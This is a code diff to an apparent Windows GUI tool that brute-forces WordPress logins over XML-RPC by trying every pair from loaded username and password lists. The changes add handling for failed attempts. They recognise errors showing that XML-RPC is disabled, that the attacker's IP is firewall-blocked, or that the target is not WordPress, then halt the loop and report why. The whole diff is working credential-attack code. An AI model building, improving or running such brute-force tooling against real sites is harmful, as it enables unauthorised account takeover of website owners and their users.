@@ -1,6 +1,7 @@
 ﻿using Abdal_Security_Group_App.Core;
 using System.Diagnostics;
 using System.Reflection;
+using System.Text.RegularExpressions;
 using CookComputing.XmlRpc;
 using Telerik.WinControls.UI;
 
@@ -18,7 +19,10 @@ namespace Abdal_Security_Group_App
     public partial class Main : Telerik.WinControls.UI.RadForm
     {
         private bool username_file_selected = false;
-
+        private int error_403 = 0;
+        private bool xmlrpDisable = false;
+        private bool isNotWordpress = false;
+        private bool forbiddenStatus = false;
         private string[] usernames_list = Array.Empty<string>();
         private string[] passwords_list = Array.Empty<string>();
 
@@ -214,6 +218,7 @@ namespace Abdal_Security_Group_App
             #region bg_worker_DoWork
 
             bool success = false;
+
             IWordPressXmlRpc proxy = XmlRpcProxyGen.Create<IWordPressXmlRpc>();
 
             attackStatusProgressBar.Value1 = 0;
@@ -248,6 +253,21 @@ namespace Abdal_Security_Group_App
             {
                 foreach (var password in passwords_list)
                 {
+                    if (xmlrpDisable)
+                    {
+                        stop_attack_status = true;
+                    }
+
+                    if (forbiddenStatus)
+                    {
+                        stop_attack_status = true;
+                    }
+
+                    if (isNotWordpress)
+                    {
+                        stop_attack_status = true;
+                    }
+
                     attackCounter++;
                     attackStatusProgressBar.Text = $"Attack Status / {attackCounter}";
 
@@ -272,6 +292,10 @@ namespace Abdal_Security_Group_App
                                 $"Username: {username}, Password: {password}\n");
 
                             ab_player.sPlayerSync("account-hc");
+                            openFileDialogUserName.Reset();
+                            openFileDialogPassword.Reset();
+                            radButton1.ForeColor = Color.White;
+                            radButton2.ForeColor = Color.White;
                             break; // Exit after the first successful login
                         }
                     }
@@ -279,6 +303,28 @@ namespace Abdal_Security_Group_App
                     {
                         list_attack_log.Items.Add($"Failed with username {username} and password {password}");
                         list_attack_log.Items.Add($"Server Error =  {ex.Message}");
+                        bool containsMethod_Not_Allowed = Regex.IsMatch(ex.Message, "Method\\s+Not\\s+Allowed",
+                            RegexOptions.IgnoreCase);
+
+                        if (containsMethod_Not_Allowed)
+                        {
+                            xmlrpDisable = true;
+                        }
+
+                        bool containsForbidden = ex.Message.ToLower().Contains("forbidden");
+
+                        if (containsForbidden)
+                        {
+                            forbiddenStatus = true;
+                        }
+
+                        bool containsNotFound = Regex.IsMatch(ex.Message, "Not\\s+Found",
+                            RegexOptions.IgnoreCase);
+
+                        if (containsNotFound)
+                        {
+                            isNotWordpress = true;
+                        }
 
 
                         // int visibleItems = list_attack_log.ClientSize.Height /
@@ -314,19 +360,58 @@ namespace Abdal_Security_Group_App
                         openFileDialogUserName.Reset();
                         openFileDialogPassword.Reset();
                         break;
-                    };
+                    }
+
+                    ;
                 }
 
                 if (success) break; // Exit the outer loop if a login was successful
                 if (stop_attack_status) break;
-                {
-                }
             }
 
             if (!success)
             {
                 ab_player.sPlayerSync("error");
                 list_attack_log.Items.Add("All login attempts failed.");
+                if (xmlrpDisable)
+                {
+                    list_attack_log.Items.Add("XML-RPC is not accessible on this target");
+                    openFileDialogUserName.Reset();
+                    openFileDialogPassword.Reset();
+                    radButton1.ForeColor = Color.White;
+                    radButton2.ForeColor = Color.White;
+                    xmlrpDisable = false;
+                    ab_player.sPlayer("error");
+                }
+
+                if (forbiddenStatus)
+                {
+                    list_attack_log.Items.Add("Your IP has been blocked by the target's firewall");
+                    openFileDialogUserName.Reset();
+                    openFileDialogPassword.Reset();
+                    radButton1.ForeColor = Color.White;
+                    radButton2.ForeColor = Color.White;
+                    forbiddenStatus = false;
+                    ab_player.sPlayer("error");
+                }
+
+                if (isNotWordpress)
+                {
+                    list_attack_log.Items.Add("Your target is not WordPress, or the required address has changed");
+                    openFileDialogUserName.Reset();
+                    openFileDialogPassword.Reset();
+                    radButton1.ForeColor = Color.White;
+                    radButton2.ForeColor = Color.White;
+                    isNotWordpress = false;
+                    ab_player.sPlayer("error");
+                }
+
+
+                if (list_attack_log.Items.Count > 0)
+                {
+                    list_attack_log.TopIndex = list_attack_log.Items.Count - 1;
+                }
+
                 this.desk_alert.CaptionText = abdal_app_name;
                 this.desk_alert.ContentText = "All login attempts failed.";
                 this.desk_alert.Show();
@@ -424,6 +509,10 @@ namespace Abdal_Security_Group_App
         }
 
         private void openFileDialogPassword_FileOk(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+        }
+
+        private void list_attack_log_TabIndexChanged(object sender, EventArgs e)
         {
         }
     }
